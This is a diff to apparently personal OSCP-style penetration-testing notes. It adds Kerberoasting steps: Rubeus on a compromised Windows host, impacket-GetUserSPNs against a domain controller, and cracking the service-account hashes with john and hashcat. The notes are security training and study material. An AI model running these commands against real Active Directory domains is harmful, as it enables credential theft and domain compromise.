@@ -2239,7 +2239,12 @@ hashcat -m 18200 hashes.txt wordlist.txt --force # cracking hashes
 ```powershell
 .\Rubeus.exe kerberoast /outfile:hashes.kerberoast #dumping from compromised windows host, and saving with customname
 
+#Identified kerberoasting using a bloodhound, the come to the assumption of kerberoasting
+#Tried with Rubeus on the MS01, but the hash cannot crack.
+#Then used the **impacket-GetUserSPNs** tool with DC IP address to crack the hash using john.
 impacket-GetUserSPNs -dc-ip <DC-IP> <domain>/<user>:<pass> -request #from kali machine
+#OSCPB 147 AD set for more information.
+john -w=/home/kali/HTB/OSCP/rockyou.txt sql_svc.hash
 
 hashcat -m 13100 hashes.txt wordlist.txt --force # cracking hashes
 ```
